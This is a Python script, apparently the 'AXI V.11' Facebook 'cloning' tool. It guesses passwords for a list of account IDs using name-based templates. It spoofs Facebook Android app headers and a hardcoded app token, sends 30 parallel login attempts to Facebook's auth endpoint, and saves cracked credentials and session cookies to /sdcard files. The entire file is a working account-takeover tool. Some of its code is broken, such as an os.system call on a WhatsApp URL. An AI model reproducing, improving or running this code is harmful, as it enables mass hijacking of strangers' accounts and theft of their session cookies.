
import os
try:
    import requests
except ModuleNotFoundError:
    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
import random,time,sys,requests,uuid,json,base64,re,zlib,shutil,platform,subprocess,tempfile,string
from concurrent.futures import ThreadPoolExecutor as loda
from bs4 import BeautifulSoup

oks = []
cps = []
plist = []
methods = []
speed = []
twf = []
loop = 0
os.system('https://chat.whatsapp.com/IjLRadygoVqD0CO9sTBvIY')

logo = """
\033[1;32m         ###    ##     ## #### 
\033[1;37m        ## ##    ##   ##   ##  
 \033[1;37m      ##   ##    ## ##    ##  
\033[1;32m      ##     ##    ###     ##  
\033[1;37m      #########   ## ##    ##  
\033[1;37m      ##     ##  ##   ##   ##  
\033[1;32m      ##     ## ##     ## ####  V.11
----------------------------------------------
  [+] Owner    :   HAMAD-JAVED 
  [+] Github   :   AXI-403
  [+] Status   :   PRIVATE 
--------------------------------------------------"""
def linex():
    print('\033[1;37m--------------------------------------------------')

def clear():
        os.system('clear')
        print(logo)

def menu():
    os.system('clear')
    print(logo)
    print('[1] File Cloning')
    print('[2] Join Whatsapp Group')
    linex()
    lomda = input('\033[1;37mChoose Option : ')
    if lomda in ['1']:
        clear()
        print('PUT FILE EXAMPLE :  /sdcard/filename.txt')
        linex()
        file = input('Enter File Name\033[1;37m: ')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            print('FILE NOT FOUND ')
            time.sleep(2)
            menu()
        clear()
        print('[1] METHOD 1')
        linex()
        mthd=input('CHOOSE : ')
        linex()
        clear()
        plist = []
        try:
            ps_limit = int(input('HOW MANY PASSWORDS DO YOU WANT ? '))
        except:
            ps_limit =1
        linex()
        clear()
        print('\033[1;37m EXAMPLE : first last,firtslast')
        linex()
        for i in range(ps_limit):
            plist.append(input(f'PUT PASSWORD {i+1}: '))
        linex()
        clear()
        with loda(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print(' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
            print("\033[1;32m CRACKING STARTED...\033[1;32m")
            linex()
            for user in fo:
                ids,names = user.split('|')
                passlist = plist
                if mthd in ['1','01']:
                    crack_submit.submit(ffb,ids,names,passlist)
                elif mthd in ['2','02']:
                    pass
                elif mthd in ['3','03']:
                    pass
        print('\033[1;37m')
        linex()
        print(' THE PROCESS HAS COMPLETED')
        print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        linex()
        input(' PRESS ENTER TO BACK ')
        os.system('python axi.py')
    elif lomda in ['2']:
            os.system('https://chat.whatsapp.com/IjLRadygoVqD0CO9sTBvIY')
    else:
        menu()

def ffb(ids,names,passlist):
        try:
                global oks,loop
                sys.stdout.write('\r\r\033[1;37m [AXI-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/270.1.0.66.127;FBBV/214895087;FBDM/{density=1.5,width=1920,height=1128};FBLC/nl_NL;FBRV/215683036;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TAB 2 A10-70F;FBSV/5.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi:;]"
                        head = {'User-Agent': ua,
                                'Accept-Encoding': 'gzip, deflate',
                                'Connection': 'Keep-Alive',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Host': 'graph.facebook.com',
                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'X-Tigon-Is-Retry': 'False',
                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                                'x-fb-device-group': '5120',
                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                'X-FB-Request-Analytics-Tags': 'graphservice',
                                'X-FB-HTTP-Engine': 'Liger',
                                'X-FB-Client-IP': 'True',
                                'X-FB-Server-Cluster': 'True',
                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        data = {'adid':str(uuid.uuid4()),
                                'format':'json',
                                'device_id':str(uuid.uuid4()),
                                'email':ids,'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                'cpl':'true',
                                'try_num':'1',
                                'family_device_id':str(uuid.uuid4()),
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'currently_logged_in_userid':'0',
                                'locale': 'en_SV','client_country_code': 'SV',
                                'fb_api_req_friendly_name':'authenticate',
                                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
                                'access_token':accees_token}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Successful-AXI] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/AXI-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/AXI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                print('\r\r \033[1;35m[2-Factor-Au-AXI] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                print('\r\r\x1b[1;90m [Check-Point-AXI] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ROCKY-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                time.sleep(20)
menu()